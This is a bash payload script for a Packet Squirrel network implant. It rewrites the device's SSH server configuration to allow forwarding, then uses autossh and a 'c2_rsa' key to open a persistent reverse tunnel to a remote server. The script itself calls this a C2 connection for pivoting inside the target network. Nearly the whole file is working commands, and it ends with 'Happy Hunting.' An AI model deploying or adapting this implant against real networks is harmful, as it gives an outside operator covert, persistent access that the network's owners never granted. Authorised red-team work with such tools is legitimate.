#!/bin/bash
# Title: SSH Socks5 Proxy tunnel to Squirrel
# Description: Creates Dynamic port forwarding available on Squirrel to allow for pivoting inside network from remote server.
# Author: BlackPropaganda

# LED State Descriptions
# Magenta Solid - SSH connecting
# Amber - SSH connection attempted
#

# More information can be found in the readme.

# 1.1.1.1 is the remote SSH server IP address on the internet,
# username is your username on the remote SSH server
autossh_host="username@1.1.1.1"
autossh_host_ip=$(echo $autossh_host | cut -d '@' -f2)
# PORT to connect to on the SSH Server
autossh_port="22"
autossh_remoteport="2223"
autossh_localport="22"

interface="wlan2"

if ! grep $autossh_host_ip /root/.ssh/known_hosts; then
   echo "$autossh_host not in known_hosts, exiting..." >> /root/autossh.log
   LED FAIL
   exit 1
fi

#
# the following was slightly modified from dark_pyrro (the legend) via:
# https://codeberg.org/dark_pyrro/Packet-Squirrel-autossh/src/branch/main/payload.sh
#

# waiting until eth1 acquires IP address
while ! ifconfig "$interface" | grep "inet addr"; do sleep 1; echo 'waiting for IP address on '$interface; done

# modifying SSHD to support TCP forwarding
echo "Match User root" >> /etc/ssh/sshd_config
echo "       AllowTcpForwarding yes"  >> /etc/ssh/sshd_config
echo -e "       GatewayPorts yes\n" >> /etc/ssh/sshd_config


echo -e "starting reconfigured server.\n" >> /root/payloads/$switch/debug.txt

# starting sshd and waiting for process to start
/etc/init.d/sshd start
until netstat -tulpn | grep -qi "sshd"
do
    sleep 1
done

# stopping autossh
/etc/init.d/autossh stop

#
# Much like the SSH server, AutoSSH has a configuration file. This
# needs to be configured to support this connection as a daemon.
#
# Create a "fresh template" for the autossh configuration
# Starting with an empty autossh file in /etc/config
# isn't something that uci is very fond of
echo "config autossh" > /etc/config/autossh
echo "        option ssh" >> /etc/config/autossh
echo "        option enabled" >> /etc/config/autossh


echo -e "starting ssh tunnel C2 connection. See you later, Space Cowboy\n" >> /root/remote/debug.txt


# UCI configuration and commission
uci set autossh.@autossh[0].ssh="-i /root/.ssh/c2_rsa -R "$autossh_remoteport":127.0.0.1:"$autossh_localport" "$autossh_host" -p "$autossh_port" -N -T"
uci set autossh.@autossh[0].enabled="1"
uci commit autossh

# starting autossh
/etc/init.d/autossh start

# Happy Hunting.
